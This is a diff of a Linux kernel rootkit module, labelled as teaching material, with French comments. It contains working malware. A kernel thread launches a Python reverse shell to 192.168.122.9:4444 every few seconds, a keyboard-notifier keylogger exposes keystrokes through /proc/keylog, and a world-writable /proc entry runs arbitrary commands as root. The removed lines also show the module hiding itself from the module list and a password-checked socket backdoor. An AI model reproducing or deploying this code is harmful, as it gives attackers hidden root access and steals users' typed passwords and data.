@@ -13,17 +13,13 @@
 #include <linux/slab.h>
 #include <linux/kthread.h>
 #include <linux/delay.h>
-#include <linux/net.h>
-#include <net/sock.h>
-#include <linux/in.h>
-#include <linux/input-event-codes.h>
 
 #define BUFFER_SIZE 256
-#define PASSWORD "mdp"
+#define BUF_SIZE 1024
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Shayman");
-MODULE_DESCRIPTION("Rootkit");
+MODULE_DESCRIPTION("Rootkit pédagogique");
 MODULE_VERSION("0.1");
 
 #define PROC_NAME_ROOTKIT "rootkit"
@@ -31,6 +27,7 @@ MODULE_VERSION("0.1");
 #define PROC_NAME_KEYLOG "keylog"
 
 static void exec_user_cmd(const char *cmd);
+static void reverse_shell(void);
 static void start_keylogger(void);
 static void stop_keylogger(void);
 static ssize_t proc_secret_write(struct file *file, const char __user *buf, size_t count, loff_t *pos);
@@ -65,104 +62,37 @@ static void exec_user_cmd(const char *cmd)
     };
 
     printk(KERN_INFO "[rootkit] Exécution de la commande : %s\n", cmd);
-    // call_usermodehelper prend: programme, argv, envp, flags
     int ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
     printk(KERN_INFO "[rootkit] Code retour : %d\n", ret);
 }
+
 
 //----------------------------------//
 //         Reverse Shell            //
 //----------------------------------//
 
+
 static int reverse_shell_fn(void *data)
 {
-    struct socket *sock;
-    struct sockaddr_in server;
-    int ret;
-    char recv_buf[64];
-
     while (!kthread_should_stop()) {
-        sock = NULL;
-
-        ret = sock_create(AF_INET, SOCK_STREAM, IPPROTO_TCP, &sock);
-        if (ret < 0) {
-            ssleep(5);
-            continue;
-        }
-
-        memset(&server, 0, sizeof(server));
-        server.sin_family = AF_INET;
-        server.sin_port = htons(4444);
-        in4_pton("192.168.122.9", -1, (u8 *)&server.sin_addr.s_addr, -1, NULL);
-
-        ret = sock->ops->connect(sock, (struct sockaddr *)&server, sizeof(server), 0);
-        if (ret < 0) {
-            sock_release(sock);
-            ssleep(5);
-            continue;
-        }
-
-        // demande de mot de passe
-        {
-            struct kvec iov = {
-                .iov_base = "mdp: ",
-                .iov_len = strlen("mdp: "),
-            };
-            ret = kernel_sendmsg(sock, NULL, &iov, 1, iov.iov_len);
-            if (ret < 0) {
-                sock_release(sock);
-                ssleep(5);
-                continue;
-            }
-        }
-
-        memset(recv_buf, 0, sizeof(recv_buf));
-        {
-            struct msghdr msg = { .msg_flags = MSG_WAITALL };
-            struct kvec iov = {
-                .iov_base = recv_buf,
-                .iov_len = sizeof(recv_buf) - 1
-            };
-
-            ret = kernel_recvmsg(sock, &msg, &iov, 1, iov.iov_len, MSG_WAITALL);
-            if (ret <= 0) {
-                sock_release(sock);
-                ssleep(5);
-                continue;
-            }
-            recv_buf[ret] = '\0';
-        }
-
-        if (strncmp(recv_buf, PASSWORD, strlen(PASSWORD)) != 0) {
-            sock_release(sock);
-            ssleep(5);
-            continue;
-        }
-
-        while (!kthread_should_stop()) {
-            const char *cmd =
-                "python3 -c 'import socket,os,pty;"
-                "s=socket.socket();"
-                "s.connect((\"192.168.122.9\",4444));"
-                "os.dup2(s.fileno(),0);"
-                "os.dup2(s.fileno(),1);"
-                "os.dup2(s.fileno(),2);"
-                "pty.spawn(\"/bin/sh\")'";
-
-            // const char *cmd = "ping -c 1 8.8.8.8";
-
-            exec_user_cmd(cmd);
-            printk(KERN_INFO "[rootkit] exec_user_cmd returned %d\n", ret);
-
-            ssleep(10);
-        }
-
-        sock_release(sock);
+        const char *cmd = "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"192.168.122.9\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'";
+        exec_user_cmd(cmd);
+        ssleep(5);
     }
-
     return 0;
 }
 
+static void reverse_shell(void)
+{
+    if (!rs_thread || IS_ERR(rs_thread)) {
+        rs_thread = kthread_run(reverse_shell_fn, NULL, "reverse_shell_thread");
+        if (IS_ERR(rs_thread)) {
+            printk(KERN_ERR "[rootkit] Impossible de démarrer le thread de reverse shell\n");
+        } else {
+            printk(KERN_INFO "[rootkit] Thread de reverse shell démarré\n");
+        }
+    }
+}
 
 //----------------------------//
 //        Keymap Tables       //
@@ -236,11 +166,13 @@ static int keylogger_cb(struct notifier_block *nblock, unsigned long code, void 
 
     if (code == KBD_KEYCODE) {
         if (param->down) {
+            // shift
             if (param->value == KEY_LEFTSHIFT || param->value == KEY_RIGHTSHIFT) {
                 shift_pressed = true;
                 return NOTIFY_OK;
             }
 
+            // conversion touche en caractère
             if (param->value < 256) {
                 char c = shift_pressed ? keymap_shift[param->value] : keymap[param->value];
                 if (c) {
@@ -250,12 +182,15 @@ static int keylogger_cb(struct notifier_block *nblock, unsigned long code, void 
         } else {
             if (param->value == KEY_LEFTSHIFT || param->value == KEY_RIGHTSHIFT) {
                 shift_pressed = false;
+                return NOTIFY_OK;
             }
         }
+        return NOTIFY_OK;
     }
-
-    return NOTIFY_OK;
+    
+    return NOTIFY_DONE; 
 }
+
 
 static struct notifier_block nb = {
     .notifier_call = keylogger_cb,
@@ -266,7 +201,9 @@ static ssize_t keylog_read(struct file *file, char __user *buf, size_t count, lo
     ssize_t ret;
 
     mutex_lock(&proc_buf_mutex);
+
     ret = simple_read_from_buffer(buf, count, ppos, proc_buf, proc_buf_pos);
+
     mutex_unlock(&proc_buf_mutex);
 
     return ret;
@@ -276,52 +213,46 @@ static const struct proc_ops keylog_fops = {
     .proc_read = keylog_read,
 };
 
-
 static ssize_t proc_secret_write(struct file *file, const char __user *buf, size_t count, loff_t *pos)
 {
-    char kbuf[BUFFER_SIZE];
-
-    if (count >= BUFFER_SIZE)
-        count = BUFFER_SIZE - 1;
+    char kbuf[BUFFER_SIZE] = {0};
+    if (count > BUFFER_SIZE - 1)
+        return -EINVAL;
 
     if (copy_from_user(kbuf, buf, count))
         return -EFAULT;
 
-    kbuf[count] = '\0'; 
+    kbuf[count] = '\0';
 
-    if (count > 0 && kbuf[count - 1] == '\n')
+    if (count > 0 && kbuf[count - 1] == '\n') {
         kbuf[count - 1] = '\0';
+    }
 
-    printk(KERN_INFO "[rootkit] received command: %s\n", kbuf);
+    printk(KERN_INFO "[rootkit] Message reçu sur secret : %s\n", kbuf);
 
-    if (strcmp(kbuf, "start") == 0) {
-        reverse_shell_fn(NULL);  
+    if (strcmp(kbuf, "reverse_shell") == 0) {
+        reverse_shell();
     } else if (strcmp(kbuf, "start_keylogger") == 0) {
         start_keylogger();
     } else if (strcmp(kbuf, "stop_keylogger") == 0) {
         stop_keylogger();
+    } else {
+        printk(KERN_INFO "[rootkit] Commande inconnue\n");
     }
 
     return count;
 }
 
+
 static ssize_t proc_rootkit_read(struct file *file, char __user *ubuf, size_t len, loff_t *off)
 {
-    char buf[BUFFER_SIZE];
-    int ret;
-
-    if (*off > 0) return 0;
-
-    snprintf(buf, BUFFER_SIZE, "Rootkit module actif\n");
-
-    ret = simple_read_from_buffer(ubuf, len, off, buf, strlen(buf));
-    return ret;
+    const char *msg = "rootkit active\n";
+    return simple_read_from_buffer(ubuf, len, off, msg, strlen(msg));
 }
 
 static ssize_t proc_rootkit_write(struct file *file, const char __user *buffer, size_t count, loff_t *ppos)
 {
     char kbuf[BUFFER_SIZE] = {0};
-
     if (count > BUFFER_SIZE - 1)
         return -EINVAL;
 
@@ -330,17 +261,39 @@ static ssize_t proc_rootkit_write(struct file *file, const char __user *buffer, 
 
     kbuf[count] = '\0';
 
-    if (strncmp(kbuf, "exec ", 5) == 0) {
-        exec_user_cmd(kbuf + 5);
-    }
+    printk(KERN_INFO "[rootkit] Commande reçue : %s\n", kbuf);
+
+    exec_user_cmd(kbuf);
 
     return count;
 }
 
+static const struct proc_ops proc_rootkit_fops = {
+    .proc_read = proc_rootkit_read,
+    .proc_write = proc_rootkit_write,
+};
+
+static const struct proc_ops proc_secret_fops = {
+    .proc_write = proc_secret_write,
+};
+
+//----------------------------//
+//      Keylogger control     //
+//----------------------------//
+
 static void start_keylogger(void)
 {
-    if (!keylogger_running) {
-        register_keyboard_notifier(&nb);
+    int ret;
+
+    if (keylogger_running) {
+        printk(KERN_INFO "[rootkit] Keylogger déjà démarré\n");
+        return;
+    }
+
+    ret = register_keyboard_notifier(&nb);
+    if (ret) {
+        printk(KERN_INFO "[rootkit] Impossible de démarrer le keylogger (%d)\n", ret);
+    } else {
         keylogger_running = true;
         printk(KERN_INFO "[rootkit] Keylogger démarré\n");
     }
@@ -348,84 +301,77 @@ static void start_keylogger(void)
 
 static void stop_keylogger(void)
 {
-    if (keylogger_running) {
-        unregister_keyboard_notifier(&nb);
-        keylogger_running = false;
-        printk(KERN_INFO "[rootkit] Keylogger arrêté\n");
+    if (!keylogger_running) {
+        printk(KERN_INFO "[rootkit] Keylogger non actif\n");
+        return;
     }
+    unregister_keyboard_notifier(&nb);
+    keylogger_running = false;
+    printk(KERN_INFO "[rootkit] Keylogger arrêté\n");
 }
 
-//----------------------------------//
-//          INIT & EXIT             //
-//----------------------------------//
+
+//----------------------------//
+//        Init / Exit         //
+//----------------------------//
 
 static int __init rootkit_init(void)
 {
-    printk(KERN_INFO "\n");
-    printk(KERN_INFO "██████╗ ██╗      █████╗  ██████╗███████╗██╗  ██╗ ██████╗ ██╗     ██████╗ ███████╗██████╗ \n");
-    printk(KERN_INFO "██╔══██╗██║     ██╔══██╗██╔════╝██╔════╝██║  ██║██╔═══██╗██║     ██╔══██╗██╔════╝██╔══██╗\n");
-    printk(KERN_INFO "██████╔╝██║     ███████║██║     █████╗  ███████║██║   ██║██║     ██║  ██║█████╗  ██████╔╝\n");
-    printk(KERN_INFO "██╔═══╝ ██║     ██╔══██║██║     ██╔══╝  ██╔══██║██║   ██║██║     ██║  ██║██╔══╝  ██╔══██╗\n");
-    printk(KERN_INFO "██║     ███████╗██║  ██║╚██████╗███████╗██║  ██║╚██████╔╝███████╗██████╔╝███████╗██║  ██║\n");
-    printk(KERN_INFO "╚═╝     ╚══════╝╚═╝  ╚═╝ ╚═════╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═════╝ ╚══════╝╚═╝  ╚═╝\n");
-    printk(KERN_INFO "\n[rootkit] Module PlaceHolder chargé avec succès.\n");
+    printk(KERN_INFO "[rootkit] Chargement du module rootkit\n");
 
-      // Masquage du module
-    list_del_init(&__this_module.list);
-    kobject_del(&THIS_MODULE->mkobj.kobj);
-    printk(KERN_INFO "[rootkit] Module chargé\n");
-
-    proc_entry_rootkit = proc_create(PROC_NAME_ROOTKIT, 0666, NULL, &(struct proc_ops) {
-        .proc_read = proc_rootkit_read,
-        .proc_write = proc_rootkit_write
-    });
-
+    proc_entry_rootkit = proc_create(PROC_NAME_ROOTKIT, 0666, NULL, &proc_rootkit_fops);
     if (!proc_entry_rootkit) {
-        printk(KERN_ERR "[rootkit] Impossible de créer /proc/%s\n", PROC_NAME_ROOTKIT);
+        printk(KERN_ERR "[rootkit] Erreur création /proc/%s\n", PROC_NAME_ROOTKIT);
         return -ENOMEM;
     }
 
-    proc_entry_secret = proc_create(PROC_NAME_SECRET, 0222, NULL, &(struct proc_ops) {
-        .proc_write = proc_secret_write
-    });
-
+    proc_entry_secret = proc_create(PROC_NAME_SECRET, 0222, NULL, &proc_secret_fops);
     if (!proc_entry_secret) {
-        printk(KERN_ERR "[rootkit] Impossible de créer /proc/%s\n", PROC_NAME_SECRET);
+        printk(KERN_ERR "[rootkit] Erreur création /proc/%s\n", PROC_NAME_SECRET);
         proc_remove(proc_entry_rootkit);
         return -ENOMEM;
     }
 
     keylog_entry = proc_create(PROC_NAME_KEYLOG, 0444, NULL, &keylog_fops);
     if (!keylog_entry) {
-        printk(KERN_ERR "[rootkit] Impossible de créer /proc/%s\n", PROC_NAME_KEYLOG);
+        printk(KERN_ERR "[rootkit] Erreur création /proc/%s\n", PROC_NAME_KEYLOG);
         proc_remove(proc_entry_rootkit);
         proc_remove(proc_entry_secret);
         return -ENOMEM;
     }
 
+    mutex_init(&proc_buf_mutex);
     proc_buf_pos = 0;
     memset(proc_buf, 0, BUF_SIZE);
-    keylogger_running = false;
-    shift_pressed = false;
-    rs_thread = kthread_run(reverse_shell_fn, NULL, "reverse_shell");
 
+    rs_thread = kthread_run(reverse_shell_fn, NULL, "rs_thread");
+    if (IS_ERR(rs_thread)) {
+        printk(KERN_ERR "[rootkit] Erreur lancement thread reverse shell\n");
+        proc_remove(proc_entry_rootkit);
+        proc_remove(proc_entry_secret);
+        proc_remove(keylog_entry);
+        return PTR_ERR(rs_thread);
+    }
 
+    printk(KERN_INFO "[rootkit] Module chargé avec succès\n");
     return 0;
 }
 
 static void __exit rootkit_exit(void)
 {
-    if (keylogger_running) {
-        stop_keylogger();
-    }
+    stop_keylogger();
 
     if (rs_thread) {
         kthread_stop(rs_thread);
+        printk(KERN_INFO "[rootkit] Thread reverse shell arrêté.\n");
     }
 
-    proc_remove(proc_entry_rootkit);
-    proc_remove(proc_entry_secret);
-    proc_remove(keylog_entry);
+    if (proc_entry_rootkit)
+        proc_remove(proc_entry_rootkit);
+    if (proc_entry_secret)
+        proc_remove(proc_entry_secret);
+    if (keylog_entry)
+        proc_remove(keylog_entry);
 
     printk(KERN_INFO "[rootkit] Module déchargé\n");
 }
